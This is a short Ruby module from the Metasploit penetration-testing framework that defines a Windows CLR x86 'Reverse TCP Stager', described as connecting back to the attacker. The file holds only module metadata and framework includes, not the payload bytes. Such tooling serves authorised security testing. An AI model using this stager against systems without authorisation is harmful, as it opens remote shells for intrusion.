##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/clr/reverse_tcp'

module MetasploitModule

  CachedSize = 283

  include Msf::Payload::Stager
  include Msf::Payload::Clr::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect back to the attacker (Windows CLR)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => '',
      'Stager'      => {'RequiresMidstager' => false}
    ))
  end
end
